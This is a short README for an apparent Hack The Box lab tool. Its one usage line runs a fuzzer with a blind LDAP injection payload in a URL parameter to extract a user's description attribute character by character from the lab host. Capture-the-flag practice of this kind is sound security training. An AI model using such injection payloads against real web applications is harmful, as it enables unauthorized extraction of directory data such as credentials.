# LDAP-Analysis-HTB
## USAGE 

```bash
python fuzzer.py --charset /usr/share/seclists/Fuzzing/alphanum-case-extra.txt --url "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
```